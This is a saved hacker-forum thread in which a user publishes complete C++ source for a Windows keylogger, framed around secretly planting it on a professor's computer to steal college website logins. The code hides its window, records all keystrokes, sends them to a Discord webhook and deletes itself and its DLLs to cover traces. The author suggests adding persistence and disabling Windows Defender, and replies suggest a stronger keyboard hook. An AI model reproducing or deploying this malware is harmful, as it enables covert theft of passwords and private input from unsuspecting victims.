<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Own a Windows Keyboard - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Windows 10 Keylogger written in C++
FOREWORD 
I am a beginner in C/C++ and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from other&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="34534.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Own a Windows Keyboard&#39;" href="34534.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/own-a-windows-keyboard/34534" />
<meta name="twitter:url" content="https://0x00sec.org/t/own-a-windows-keyboard/34534" />
<meta property="og:title" content="Own a Windows Keyboard" />
<meta name="twitter:title" content="Own a Windows Keyboard" />
<meta property="og:description" content="Windows 10 Keylogger written in C++ FOREWORD  I am a beginner in C/C++ and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from others.  Please note that it was written for EDUCATIONAL PURPOSES  The scenario that is mentioned in the blog is fictional   INTRODUCTION  There are various different malware and lots of different projects I could develop. In the end, I was out of ideas and nothing would drive me. The..." />
<meta name="twitter:description" content="Windows 10 Keylogger written in C++ FOREWORD  I am a beginner in C/C++ and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from others.  Please note that it was written for EDUCATIONAL PURPOSES  The scenario that is mentioned in the blog is fictional   INTRODUCTION  There are various different malware and lots of different projects I could develop. In the end, I was out of ideas and nothing would drive me. The..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="programming" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="3 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="20 ❤" />
<meta property="article:published_time" content="2023-04-15T21:03:46+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="34534.html">Own a Windows Keyboard</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/programming.html" class="discourse-tag" rel="tag">programming</a>,
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Own a Windows Keyboard">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="programming, malware, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/RiskLimit"><span itemprop="name">RiskLimit</span></a>
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-15T21:03:46Z" class="post-time">
April 15, 2023, 9:03pm
</time>
<meta itemprop="dateModified" content="2023-05-15T19:16:52Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<h1>
<a name="windows-10-keylogger-written-in-c-1" class="anchor" href="34534.html#windows-10-keylogger-written-in-c-1"></a>Windows 10 Keylogger written in C++</h1>
<p><strong>FOREWORD</strong><br>
I am a beginner in C/C++ and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from others.</p>
<p><em>Please note that it was written for <strong>EDUCATIONAL PURPOSES</strong></em><br>
<em>The scenario that is mentioned in the blog is <strong>fictional</strong></em></p>
<hr>
<p><strong>INTRODUCTION</strong><br>
There are various different malware and lots of different projects I could develop. In the end, I was out of ideas and nothing would drive me. There was no use for me to write any projects because I didn’t have motivation, or some sort of reward system in my head. I could write a simple rootkit for Linux, but I wouldn’t use it anywhere - no reward.</p>
<p>I made up this scenario in my head where I had to write malware for a specific target that I want to get data from. So I came up with an idea of a keylogger. What if I had to get into the website of my college? My college professor had logins to the college website where I could send emails, change grades and more. I could own the system. But how?</p>
<p>This exciting plan came to mind. The professor logs in to the website during class. I could bring a USB with some type of malware and plug it in his PC when he’s out of the class, move the executable to some random folder and run it there. The malware then logs all keystrokes for x minutes, after that it returns the keystrokes to my Discord server through a webhook and the executable self-deletes hiding its traces.</p>
<hr>
<p><strong>DOCUMENTATION</strong><br>
I’m not skilled enough to write code that is functional to send messages to a Discord webhook, although I am skilled enough to find a library that does it for me. I found this library D++, it’s a Discord C++ library and it does everything that I need.</p>
<p><em>How the keylogger is supposed to work:</em></p>
<ul>
<li>Run silently in background</li>
<li>Log all keys</li>
<li>Count time using threads at the same time</li>
<li>After time expires send all keys to Discord webhook</li>
<li>Self-delete and hide all traces</li>
</ul>
<pre><code class="lang-cpp">using std::thread;
using std::string;
using std::cout;

void countTime(); // counts time
void StealthMode(); // runs in the background
void StartLogging(string&amp;); // logs all keys to a string
void SendKeyz(string); // send keys
void DelMe(); // self-delete
// Defining the functions
</code></pre>
<p>Writing functions in a class Functions. No idea what I’m doing, but it works <img src="../../images/emoji/twitter/smile.png%3Fv=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
<pre><code class="lang-cpp">class Functions {
public:
    void DelMe() // function to delete self after running
    {
        TCHAR szModuleName[MAX_PATH];
        TCHAR szCmd[2 * MAX_PATH];
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileName(NULL, szModuleName, MAX_PATH);

        StringCbPrintf(szCmd, 2 * MAX_PATH, "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \"%s\"", szModuleName); // cmd.exe ping ... del

        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        exit(0);
    }

    void countTime(string&amp; keyz) { // function to count for how much time to run the program
        int i = 30; // seconds for how long to run 
        for(;i=&lt;0;i--){
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        SendKeyz(keyz);
        DelMe();
    }
</code></pre>
<p>The self delete function and count time function, please let me know if there’s something that needs changing.</p>
<p>Function that logs all the keys. You can add more keys or remove certain keys that you don’t need. Even logs mouse clicks.</p>
<pre><code class="lang-cpp">void StartLogging(string&amp; keyz) { // function to log keys
        char c;

        for (;;) {

            for (c = 8; c &lt;= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {

                    if (((c &gt; 64) &amp;&amp; (c &lt; 91)) &amp;&amp; !(GetAsyncKeyState(0x10)))
                    {
                        c += 32;
                        keyz += c;
                        
                        break;
                    }
                    else if ((c &gt; 64) &amp;&amp; (c &lt; 91))
                    {
                        keyz += c;
                       
                        break;
                    }
                    else {

                        switch (c)
                        {
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += ")";
                            else
                                keyz += "0";
                        }
                        break;

                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "!";
                            else
                                keyz += "1";
                        }
                        break;

                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "@";
                            else
                                keyz += "2";
                        }
                        break;

                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "#";
                            else
                                keyz += "3";
                        }
                        break;

                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "$";
                            else
                                keyz += "4";
                        }
                        break;

                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "%";
                            else
                                keyz += "5";
                        }
                        break;

                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "^";
                            else
                                keyz += "6";
                        }
                        break;

                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "&amp;";
                            else
                                keyz += "7";
                        }
                        break;

                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "*";
                            else
                                keyz += "8";
                        }
                        break;

                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "(";
                            else
                                keyz += "9";
                        }
                        break;

                        case VK_SPACE:
                            keyz += " ";
                            break;
                        case VK_RETURN:
                            keyz += "\n";
                            break;
                        case VK_TAB:
                            keyz += "  ";
                            break;
                        case VK_BACK:
                            keyz += " &lt;BACKSPACE&gt; ";
                            break;
                        case VK_DELETE:
                            keyz += " &lt;Del&gt; ";
                            break;
                        case VK_NUMPAD0:
                            keyz += "0";
                            break;
                        case VK_NUMPAD1:
                            keyz += "1";
                            break;
                        case VK_NUMPAD2:
                            keyz += "2";
                            break;
                        case VK_NUMPAD3:
                            keyz += "3";
                            break;
                        case VK_NUMPAD4:
                            keyz += "4";
                            break;
                        case VK_NUMPAD5:
                            keyz += "5";
                            break;
                        case VK_NUMPAD6:
                            keyz += "6";
                            break;
                        case VK_NUMPAD7:
                            keyz += "7";
                            break;
                        case VK_NUMPAD8:
                            keyz += "8";
                            break;
                        case VK_NUMPAD9:
                            keyz += "9";
                            break;
                        case VK_LBUTTON:
                            keyz += " **MOUSE_LEFT** ";
                            break;
                        case VK_RBUTTON:
                            keyz += " **MOUSE RIGHT** ";
                            break;
                        case VK_CAPITAL:
                            keyz += " **CAPS** ";
                            break;
                        case VK_SHIFT:
                            keyz += " **SHIFT** ";
                            break;
                        default:
                            keyz += c;
                        }
                    }
                }
            }
        }
    }
</code></pre>
<p>Function to run in the background and the other one to send keys to the Discord webhook using D++ library.</p>
<pre><code class="lang-cpp">void StealthMode() { // function to hide window and run in the background
        AllocConsole();
        HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);
    }

    void SendKeyz(string keyz) // function to send logged keys to discord webhook
    {
        dpp::cluster bot("");
        dpp::webhook wh("WEBHOOK"); // replace with your discord webhook. could probably encrypt it or something if someone decides to reverse engineer the malware
        bot.execute_webhook(wh, dpp::message(keyz));     
    }
}
</code></pre>
<p>The main function. Using threads, which uses a lot of CPU, but I have ran into issues when not using threads at all.</p>
<pre><code class="lang-cpp">int main() {
    Functions FunctionObject;
    string c;

    thread t1(&amp;Functions::countTime, &amp;FunctionObject, ref(c));
    thread t2(&amp;Functions::StartLogging, &amp;FunctionObject, ref(c));
    thread t3(&amp;Functions::StealthMode, &amp;FunctionObject);

    t1.detach();
    t2.join();
    t1.join();
    t3.join();

    return 0;
}
</code></pre>
<p>The whole code:</p>
<pre><code class="lang-cpp">#include &lt;dpp/dpp.h&gt;
#include &lt;iostream&gt;
#include &lt;winuser.h&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;
#include &lt;chrono&gt;
#include &lt;thread&gt;
#include &lt;windows.h&gt;
#include &lt;strsafe.h&gt;

// You'll need DPP dll file and a few other dll files in the same directory so I made a batch script to delete those as well
/*
timeout 3660 &gt; NUL
del /f dpp.dll &amp;&amp; del /f libcrypto-1_1-x64.dll &amp;&amp; del /f libsodium.dll
del /f libssl-1_1-x64.dll &amp;&amp; del /f opus.dll &amp;&amp; del /f zlib1.dll
del /f Srfx.exe
(goto) 2&gt;nul &amp; del "%~f0"
*/

using std::thread;
using std::string;
using std::cout;

void countTime();
void StealthMode();
void StartLogging(string&amp;);
void SendKeyz(string);
void DelMe();

class Functions {
public:
    void DelMe() // function to delete self after running
    {
        TCHAR szModuleName[MAX_PATH];
        TCHAR szCmd[2 * MAX_PATH];
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };

        GetModuleFileName(NULL, szModuleName, MAX_PATH);

        StringCbPrintf(szCmd, 2 * MAX_PATH, "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del /f /q \"%s\"", szModuleName); // cmd.exe ping ... del

        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        exit(0);
    }

    void countTime(string&amp; keyz) { // function to count for how much time to run the program
        int i=30;
        for(;i=&lt;0;i--){
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        SendKeyz(keyz);
        DelMe();
    }

    void StartLogging(string&amp; keyz) { // function to log keys
        char c;

        for (;;) {

            for (c = 8; c &lt;= 222; c++) {
                if (GetAsyncKeyState(c) == -32767) {

                    if (((c &gt; 64) &amp;&amp; (c &lt; 91)) &amp;&amp; !(GetAsyncKeyState(0x10)))
                    {
                        c += 32;
                        keyz += c;
                        
                        break;
                    }
                    else if ((c &gt; 64) &amp;&amp; (c &lt; 91))
                    {
                        keyz += c;
                       
                        break;
                    }
                    else {

                        switch (c)
                        {
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += ")";
                            else
                                keyz += "0";
                        }
                        break;

                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "!";
                            else
                                keyz += "1";
                        }
                        break;

                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "@";
                            else
                                keyz += "2";
                        }
                        break;

                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "#";
                            else
                                keyz += "3";
                        }
                        break;

                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "$";
                            else
                                keyz += "4";
                        }
                        break;

                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "%";
                            else
                                keyz += "5";
                        }
                        break;

                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "^";
                            else
                                keyz += "6";
                        }
                        break;

                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "&amp;";
                            else
                                keyz += "7";
                        }
                        break;

                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "*";
                            else
                                keyz += "8";
                        }
                        break;

                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "(";
                            else
                                keyz += "9";
                        }
                        break;

                        case VK_SPACE:
                            keyz += " ";
                            break;
                        case VK_RETURN:
                            keyz += "\n";
                            break;
                        case VK_TAB:
                            keyz += "  ";
                            break;
                        case VK_BACK:
                            keyz += " &lt;BACKSPACE&gt; ";
                            break;
                        case VK_DELETE:
                            keyz += " &lt;Del&gt; ";
                            break;
                        case VK_NUMPAD0:
                            keyz += "0";
                            break;
                        case VK_NUMPAD1:
                            keyz += "1";
                            break;
                        case VK_NUMPAD2:
                            keyz += "2";
                            break;
                        case VK_NUMPAD3:
                            keyz += "3";
                            break;
                        case VK_NUMPAD4:
                            keyz += "4";
                            break;
                        case VK_NUMPAD5:
                            keyz += "5";
                            break;
                        case VK_NUMPAD6:
                            keyz += "6";
                            break;
                        case VK_NUMPAD7:
                            keyz += "7";
                            break;
                        case VK_NUMPAD8:
                            keyz += "8";
                            break;
                        case VK_NUMPAD9:
                            keyz += "9";
                            break;
                        case VK_LBUTTON:
                            keyz += " **MOUSE_LEFT** ";
                            break;
                        case VK_RBUTTON:
                            keyz += " **MOUSE RIGHT** ";
                            break;
                        case VK_CAPITAL:
                            keyz += " **CAPS** ";
                            break;
                        case VK_SHIFT:
                            keyz += " **SHIFT** ";
                            break;
                        default:
                            keyz += c;
                        }
                    }
                }
            }
        }
    }
    void StealthMode() { // function to hide window and run in the background
        AllocConsole();
        HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);
    }

    void SendKeyz(string keyz) // function to send logged keys to discord webhook
    {
        dpp::cluster bot("");
        dpp::webhook wh("WEBHOOK");
        bot.execute_webhook(wh, dpp::message(keyz));     
    }
};

int main() {
    Functions FunctionObject;
    string c;

    thread t1(&amp;Functions::countTime, &amp;FunctionObject, ref(c));
    thread t2(&amp;Functions::StartLogging, &amp;FunctionObject, ref(c));
    thread t3(&amp;Functions::StealthMode, &amp;FunctionObject);

    t1.detach();
    t2.join();
    t1.join();
    t3.join();

    return 0;
}
</code></pre>
<p>You could add other features like adding it to startup or gaining admin privs and disabling windows defender, although last time I checked this was undetectable.</p>
<p>That’s the end of this thread. This is my first post, so let me know if there’s something wrong with it. Feel free to leave a like if you found this useful and let me know if there are any bugs that I’m not aware of.</p>
<p><strong>Full Code</strong></p><aside class="onebox allowlistedgeneric" data-onebox-src="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook">
<header class="source">
<img src="https://codeberg.org/assets/img/favicon.svg" class="site-icon" width="15" height="15">
<a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">Codeberg.org</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/3X/e/e/ee03c3e147b566430d65580159917e53b12deaf3.png" class="thumbnail onebox-avatar" width="290" height="290">
<h3><a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">WindowsKeylogger-DCWebhook</a></h3>
<p>Windows10 C++ keylogger with Discord webhook implementation, run in background and threads. FUD on most AVs</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Lemovice"><span itemprop="name">Lemovice</span></a>
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-22T19:53:32Z" class="post-time">
April 22, 2023, 7:53pm
</time>
<meta itemprop="dateModified" content="2023-04-22T19:59:35Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Why are you using <code>GetAsyncKeyState</code>, just hook the keyboard with <code>SetWindowsHookEx</code> and <code>WH_KEYBOARD_LL</code>, Otherwise the code is good</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/whatsacomputer"><span itemprop="name">whatsacomputer</span></a>
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-25T03:49:22Z" class="post-time">
April 25, 2023, 3:49am
</time>
<meta itemprop="dateModified" content="2023-04-25T03:49:22Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="RiskLimit" data-post="1" data-topic="34534">
<div class="title">
<div class="quote-controls"></div>
<img loading="lazy" alt width="20" height="20" src="../../user_avatar/0x00sec.org/risklimit/40/46481_2.png" class="avatar"> RiskLimit:</div>
<blockquote>
<p>Writing functions in a class Functions. No idea what I’m doing, but it works <img src="../../images/emoji/twitter/smile.png%3Fv=12" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>
</blockquote>
</aside>
<p>mood. lmfao<br>
Why use keystates? You can open a hook to the keyboard and virtual keys for translation</p>
<p>also need github, anonfiles or such for the code. easier</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/RiskLimit"><span itemprop="name">RiskLimit</span></a>
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-27T19:09:00Z" class="post-time">
April 27, 2023, 7:09pm
</time>
<meta itemprop="dateModified" content="2023-04-27T19:09:00Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hey everyone, thanks for all the replies! I’m a bit busy now, but once I have more time I’ll fix the code and update the post.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/RiskLimit"><span itemprop="name">RiskLimit</span></a>
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-30T10:17:22Z" class="post-time">
April 30, 2023, 10:17am
</time>
<meta itemprop="dateModified" content="2023-04-30T10:17:22Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Full code:</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook">
<header class="source">
<img src="https://codeberg.org/assets/img/favicon.svg" class="site-icon" width="15" height="15">
<a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">Codeberg.org</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/3X/e/e/ee03c3e147b566430d65580159917e53b12deaf3.png" class="thumbnail onebox-avatar" width="290" height="290">
<h3><a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">WindowsKeylogger-DCWebhook</a></h3>
<p>Windows10 C++ keylogger with Discord webhook implementation, run in background and threads. FUD on most AVs</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/RiskLimit"><span itemprop="name">RiskLimit</span></a>
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-30T10:18:09Z" class="post-time">
April 30, 2023, 10:18am
</time>
<meta itemprop="dateModified" content="2023-04-30T10:18:09Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>What’s the difference though? Between <code>GetAsyncKeyState</code> and <code>SetWindowsHookEx</code></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
